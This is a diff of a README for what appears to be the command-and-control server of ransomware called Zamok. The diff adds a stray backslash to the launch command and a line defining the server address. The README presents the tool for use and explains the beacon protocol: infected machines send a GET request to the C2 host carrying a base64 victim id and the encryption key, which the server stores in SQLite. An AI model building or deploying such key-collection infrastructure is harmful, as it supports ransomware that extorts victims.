@@ -13,7 +13,7 @@ A simple but effective C2 Server for Zamok
     ```
 You can now start it by simply running :
     ```
-    ./zamokc2
+    \./zamokc2
     ```
 
 ## How it works :
@@ -24,6 +24,7 @@ You can now start it by simply running :
     GET http://c2.server:8080/<SOME_STRING>
     ```
     Where :
+    - c2.server is the URL or IP Address where the C2 is running
     - SOME_STRING is a base64 string of a unique victim machine id and the encryption/decryption key concatenated with a :
 4. The C2 breaks down the request and gets the 2 values : the id and the key
 5. It saves these values to an SQLite database locally 
